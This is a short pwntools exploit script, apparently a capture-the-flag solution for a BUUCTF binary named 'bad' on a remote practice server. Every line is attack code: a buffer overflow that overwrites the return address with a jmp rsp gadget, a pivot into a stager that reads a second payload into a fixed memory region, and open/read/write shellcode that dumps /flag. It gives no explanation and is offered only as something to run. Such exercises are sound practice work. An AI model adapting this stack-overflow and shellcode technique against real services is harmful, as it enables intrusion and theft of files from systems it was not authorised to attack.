from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
# io = process('./bad')
elf = ELF('./bad')
io = remote('node4.buuoj.cn',25023)

mmap = 0x123000
shellcode = shellcraft.open('/flag')
shellcode += shellcraft.read(3,mmap + 0x200,0x50)
shellcode += shellcraft.write(1,mmap + 0x200,0x50)
shellcode = asm(shellcode)

jmp_rsp = 0x400A01
payload = asm(shellcraft.read(0, mmap, 0x100)) + asm('mov rax,0x123000;call rax')
payload = payload.ljust(0x28, b'a') + p64(jmp_rsp) + asm('sub rsp,0x30;jmp rsp')
io.sendafter(b'Easy shellcode, have fun!',payload)
sleep(1)
io.send(shellcode)
io.interactive()